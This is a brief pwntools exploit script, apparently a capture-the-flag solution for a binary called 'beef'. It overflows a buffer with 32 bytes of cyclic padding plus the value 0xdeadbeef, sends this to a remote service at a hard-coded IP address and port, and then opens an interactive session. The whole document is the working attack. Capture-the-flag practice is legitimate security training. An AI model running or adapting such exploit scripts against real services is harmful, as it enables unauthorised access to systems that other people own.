from pwn import *
elf = ELF("./beef")
r = process("./beef")
r = remote("139.144.184.150", 31337)
pas = 0xdeadbeef
payload = cyclic(32) + p32(pas)
r.sendline(payload)
r.interactive()